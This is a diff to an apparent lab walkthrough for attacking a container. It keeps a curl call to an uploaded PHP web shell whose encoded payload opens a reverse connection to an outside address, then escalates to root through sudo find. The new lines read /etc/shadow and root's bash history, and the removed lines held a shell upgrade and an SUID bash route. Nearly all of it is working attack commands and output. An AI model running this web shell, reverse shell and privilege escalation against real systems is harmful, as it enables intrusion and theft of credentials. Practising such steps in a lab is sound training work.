@@ -213,16 +213,7 @@ curl "http://localhost/avatars/shell.php?cmd=cGhwIC1yICckcz1mc29ja29wZW4oIjE3Mi4
 ```
 > Connection arrives at the listener — mute shell with no prompt
 
-Upgrade the shell (in Terminal 1):
-```bash
-python3 -c 'import pty;pty.spawn("/bin/bash")'
-```
-Press `Ctrl+Z`, then:
-```bash
-stty raw -echo; fg
-```
-Press Enter twice.
-> `www-data@container:/var/www/html$` — full interactive shell
+> Connection arrives — limited shell, no prompt. Enough to run commands.
 
 ---
 
@@ -234,27 +225,10 @@ sudo -l
 ```
 > `(root) NOPASSWD: /usr/bin/find`
 
-Option A — GTFOBins with sudo find:
+GTFOBins with sudo find (no TTY needed):
 ```bash
-sudo find . -exec /bin/bash \; -quit
+sudo find . -exec /bin/bash -c 'whoami' \; -quit
+sudo find . -exec /bin/bash -c 'cat /etc/shadow' \; -quit
+sudo find . -exec /bin/bash -c 'cat /root/.bash_history' \; -quit
 ```
-```bash
-whoami
-```
-> `root`
-
-Option B — SUID bash:
-```bash
-/tmp/rootbash -p
-whoami
-```
-> `root`
-
-Explore as root:
-```bash
-id
-cat /etc/shadow
-ls -la /root
-cat /root/.bash_history
-```
-> `uid=0(root) gid=0(root)` — full container control
+> `root` — `uid=0(root) gid=0(root)` — full container control
